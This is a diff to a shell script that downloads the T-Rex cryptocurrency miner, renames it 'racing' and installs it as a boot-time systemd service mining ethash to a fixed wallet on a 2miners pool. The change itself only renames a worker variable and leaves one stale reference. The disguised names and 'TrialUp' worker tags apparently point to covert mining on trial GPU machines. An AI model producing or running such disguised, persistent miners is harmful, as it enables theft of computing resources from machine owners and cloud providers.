@@ -1,5 +1,5 @@
 cd /home
-woker=$(date +'%d%m_%H%M%S_TrialUp_')
+myworker=$(date +'%d%m_%H%M%S_TrialUp_')
 username=$HOSTNAME
 myworker+=$username
 sudo apt-get install linux-headers-$(uname -r) -y
@@ -22,7 +22,7 @@ sudo systemctl start nvidia-fabricmanager
 wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
 tar -zxvf t-rex-0.25.12-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w ${woker}_re_trial_up\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w ${myworker}_re_trial_up\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 ./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qmc9jdygf4kn03rq7hg692uyhcya9gfhymsug2q -p x -w $woker &
